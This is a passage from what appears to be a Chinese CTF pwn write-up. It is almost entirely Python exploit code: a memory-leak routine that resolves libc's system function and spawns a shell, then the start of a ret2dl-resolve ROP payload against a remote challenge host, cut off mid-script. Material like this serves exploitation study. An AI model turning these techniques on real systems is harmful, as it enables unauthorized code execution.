class="python plain">phdr</code></div><div class="line number93 index92 alt2"><code class="python comments">#&nbsp;find&nbsp;dynamic&nbsp;section&nbsp;table&nbsp;(.dynamic&nbsp;section&nbsp;-&gt;&nbsp;DYNAMIC&nbsp;segment)</code></div><div class="line number94 index93 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">find_dyn_section(phdr,&nbsp;elf_base):</code></div><div class="line number95 index94 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">BITS&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">64</code><code class="python plain">:</code></div><div class="line number96 index95 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">phdr_ent&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">phdr</code></div><div class="line number97 index96 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code>&nbsp;<code class="python color1">True</code><code class="python plain">:</code></div><div class="line number98 index97 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l32(leak(phdr_ent,&nbsp;</code><code class="python value">0x4</code><code class="python plain">))</code></div><div class="line number99 index98 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;p_type&nbsp;of&nbsp;dynamic&nbsp;segment&nbsp;is&nbsp;0x2</code></div><div class="line number100 index99 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x2</code><code class="python plain">:</code></div><div class="line number101 index100 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number102 index101 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">phdr_ent&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x38</code></div><div class="line number103 index102 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dyn_section&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(phdr_ent&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">elf_base</code></div><div class="line number104 index103 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python string">'[+]&nbsp;.dynamic&nbsp;section&nbsp;headers&nbsp;table\t:\t0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">dyn_section</code></div><div class="line number105 index104 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">dyn_section</code></div><div class="line number106 index105 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">find_sym_str_table(dyn_section):</code></div><div class="line number107 index106 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">BITS&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">64</code><code class="python plain">:</code></div><div class="line number108 index107 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dyn_ent&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">dyn_section</code></div><div class="line number109 index108 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dt_sym_tab&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code></div><div class="line number110 index109 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dt_str_tab&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code></div><div class="line number111 index110 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code>&nbsp;<code class="python color1">True</code><code class="python plain">:</code></div><div class="line number112 index111 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(dyn_ent,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))</code></div><div class="line number113 index112 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x6</code><code class="python plain">:</code></div><div class="line number114 index113 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dt_sym_tab&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(dyn_ent&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x8</code><code class="python plain">,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))</code></div><div class="line number115 index114 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code>&nbsp;<code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x5</code><code class="python plain">:</code></div><div class="line number116 index115 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dt_str_tab&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(dyn_ent&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x8</code><code class="python plain">,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))</code></div><div class="line number117 index116 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">dt_str_tab&nbsp;</code><code class="python keyword">and</code>&nbsp;<code class="python plain">dt_sym_tab:</code></div><div class="line number118 index117 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number119 index118 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dyn_ent&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x10</code></div><div class="line number120 index119 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python string">'[+]&nbsp;symtab\t\t\t\t:\t0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">dt_sym_tab</code></div><div class="line number121 index120 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python string">'[+]&nbsp;strtab\t\t\t\t:\t0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">dt_str_tab</code></div><div class="line number122 index121 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">(dt_sym_tab,&nbsp;dt_str_tab)</code></div><div class="line number123 index122 alt2"><code class="python keyword">def</code>&nbsp;<code class="python plain">find_func_adr(dt_sym_tab,&nbsp;dt_str_tab,&nbsp;func,&nbsp;elf_base):</code></div><div class="line number124 index123 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">BITS&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">64</code><code class="python plain">:</code></div><div class="line number125 index124 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sym_ent&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">dt_sym_tab</code></div><div class="line number126 index125 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code>&nbsp;<code class="python color1">True</code><code class="python plain">:</code></div><div class="line number127 index126 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l32(leak(sym_ent,&nbsp;</code><code class="python value">0x4</code><code class="python plain">))</code></div><div class="line number128 index127 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">name&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">leak(dt_str_tab&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">garbage,&nbsp;</code><code class="python functions">len</code><code class="python plain">(func))</code></div><div class="line number129 index128 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">name&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python plain">func:</code></div><div class="line number130 index129 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number131 index130 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sym_ent&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x18</code></div><div class="line number132 index131 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">adr_func&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(sym_ent&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x8</code><code class="python plain">,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">elf_base</code></div><div class="line number133 index132 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python string">'[+]&nbsp;%s&nbsp;loaded&nbsp;address\t:\t0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">(func,&nbsp;adr_func)</code></div><div class="line number134 index133 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">adr_func</code></div><div class="line number135 index134 alt2"><code class="python comments">#&nbsp;exploit&nbsp;ELF</code></div><div class="line number136 index135 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">lookup(func):</code></div><div class="line number137 index136 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">entry&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">get_elf_entry(got_read)</code></div><div class="line number138 index137 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">elf_base&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">find_elf_base(entry)</code></div><div class="line number139 index138 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">phdr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">find_phdr(elf_base)</code></div><div class="line number140 index139 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dyn_section&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">find_dyn_section(phdr,&nbsp;elf_base)</code></div><div class="line number141 index140 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dt_sym_tab,&nbsp;dt_str_tab&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">find_sym_str_table(dyn_section)</code></div><div class="line number142 index141 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">func_address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">find_func_adr(dt_sym_tab,&nbsp;dt_str_tab,&nbsp;func,&nbsp;elf_base)</code></div><div class="line number143 index142 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">func_address</code></div><div class="line number144 index143 alt1"><code class="python plain">leak(got_read,&nbsp;</code><code class="python value">0x8</code><code class="python plain">)</code></div><div class="line number145 index144 alt2"><code class="python plain">adr_system&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">lookup(</code><code class="python string">'__libc_system'</code><code class="python plain">)</code></div><div class="line number146 index145 alt1"><code class="python keyword">print</code>&nbsp;<code class="python string">'[+]&nbsp;system&nbsp;addr\t:\t'</code>&nbsp;<code class="python keyword">+</code>&nbsp;<code class="python functions">hex</code><code class="python plain">(adr_system)</code></div><div class="line number147 index146 alt2"><code class="python plain">getshell(adr_system)</code></div><div class="line number148 index147 alt1"><code class="python plain">io.itr()</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">ret2dl-resolve</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div><div class="line number84 index83 alt1">84</div><div class="line number85 index84 alt2">85</div><div class="line number86 index85 alt1">86</div><div class="line number87 index86 alt2">87</div><div class="line number88 index87 alt1">88</div><div class="line number89 index88 alt2">89</div><div class="line number90 index89 alt1">90</div><div class="line number91 index90 alt2">91</div><div class="line number92 index91 alt1">92</div><div class="line number93 index92 alt2">93</div><div class="line number94 index93 alt1">94</div><div class="line number95 index94 alt2">95</div><div class="line number96 index95 alt1">96</div><div class="line number97 index96 alt2">97</div><div class="line number98 index97 alt1">98</div><div class="line number99 index98 alt2">99</div><div class="line number100 index99 alt1">100</div><div class="line number101 index100 alt2">101</div><div class="line number102 index101 alt1">102</div><div class="line number103 index102 alt2">103</div><div class="line number104 index103 alt1">104</div><div class="line number105 index104 alt2">105</div><div class="line number106 index105 alt1">106</div><div class="line number107 index106 alt2">107</div><div class="line number108 index107 alt1">108</div><div class="line number109 index108 alt2">109</div><div class="line number110 index109 alt1">110</div><div class="line number111 index110 alt2">111</div><div class="line number112 index111 alt1">112</div><div class="line number113 index112 alt2">113</div><div class="line number114 index113 alt1">114</div><div class="line number115 index114 alt2">115</div><div class="line number116 index115 alt1">116</div><div class="line number117 index116 alt2">117</div><div class="line number118 index117 alt1">118</div><div class="line number119 index118 alt2">119</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">zio&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python keyword">*</code></div><div class="line number2 index1 alt1"><code class="python plain">io&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">zio((</code><code class="python string">'119.28.63.211'</code><code class="python plain">,&nbsp;</code><code class="python value">2332</code><code class="python plain">),&nbsp;print_read&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">COLORED(</code><code class="python functions">REPR</code><code class="python plain">,&nbsp;</code><code class="python string">'red'</code><code class="python plain">),&nbsp;print_write&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">COLORED(</code><code class="python functions">REPR</code><code class="python plain">,&nbsp;</code><code class="python string">'blue'</code><code class="python plain">),&nbsp;timeout&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">100000</code><code class="python plain">)</code></div><div class="line number3 index2 alt2"><code class="python comments">#&nbsp;io&nbsp;&nbsp;=&nbsp;zio('./pwn100_strip',&nbsp;print_read&nbsp;=&nbsp;COLORED(REPR,&nbsp;'red'),&nbsp;print_write&nbsp;=&nbsp;COLORED(REPR,&nbsp;'blue'),&nbsp;timeout&nbsp;=&nbsp;100000)</code></div><div class="line number4 index3 alt1"><code class="python comments">#&nbsp;io&nbsp;=&nbsp;zio(('119.28.63.211',&nbsp;2332),&nbsp;print_read&nbsp;=&nbsp;False,&nbsp;print_write&nbsp;=&nbsp;False,&nbsp;timeout&nbsp;=&nbsp;10000)</code></div><div class="line number5 index4 alt2"><code class="python comments">#io.hint([0x4006b7])</code></div><div class="line number6 index5 alt1"><code class="python plain">junk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x48</code></div><div class="line number7 index6 alt2"><code class="python plain">plt_puts&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0000000000400500</code></div><div class="line number8 index7 alt1"><code class="python plain">plt_resolve&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x00000000004004f0</code></div><div class="line number9 index8 alt2"><code class="python plain">got_read&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0000000000601028</code></div><div class="line number10 index9 alt1"><code class="python plain">got_puts&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0000000000601018</code></div><div class="line number11 index10 alt2"><code class="python plain">got_linkmap&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0000000000601008</code></div><div class="line number12 index11 alt1"><code class="python plain">leave_ret&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x000000000040068c</code></div><div class="line number13 index12 alt2"><code class="python plain">pop_rbp_ret&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0000000000400595</code></div><div class="line number14 index13 alt1"><code class="python plain">pop_rdi_ret&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0000000000400763</code></div><div class="line number15 index14 alt2"><code class="python plain">p4_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x000000000040075c</code></div><div class="line number16 index15 alt1"><code class="python plain">adr_stage&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0000000000601000</code>&nbsp;<code class="python keyword">+</code>&nbsp;<code class="python value">0x800</code></div><div class="line number17 index16 alt2"><code class="python plain">adr_rel_plt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0000000000400450</code></div><div class="line number18 index17 alt1"><code class="python plain">adr_dyn_sym&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x00000000004002c0</code></div><div class="line number19 index18 alt2"><code class="python plain">adr_dyn_str&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0000000000400380</code></div><div class="line number20 index19 alt1"><code class="python plain">adr_fake_rel_plt&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">adr_stage&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x100</code></div><div class="line number21 index20 alt2"><code class="python plain">adr_fake_dyn_sym&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">adr_stage&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x208</code></div><div class="line number22 index21 alt1"><code class="python plain">adr_fake_dyn_str&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">adr_stage&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x300</code></div><div class="line number23 index22 alt2"><code class="python plain">adr_shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">adr_stage&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x400</code></div><div class="line number24 index23 alt1"><code class="python plain">com_part1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x40075a</code></div><div class="line number25 index24 alt2"><code class="python plain">com_part2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x400740</code></div><div class="line number26 index25 alt1"><code class="python plain">adr_entry&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x400550</code></div><div class="line number27 index26 alt2"><code class="python keyword">def</code>&nbsp;<code class="python plain">prepare(address):</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload0&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python plain">junk</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload0&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(pop_rdi_ret)</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload0&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(address)</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload0&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(plt_puts)</code></div><div class="line number32 index31 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload0&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(adr_entry)</code></div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload0&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">payload0.ljust(</code><code class="python value">0xc8</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)</code></div><div class="line number34 index33 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.w(payload0)</code></div><div class="line number35 index34 alt2"><code class="python 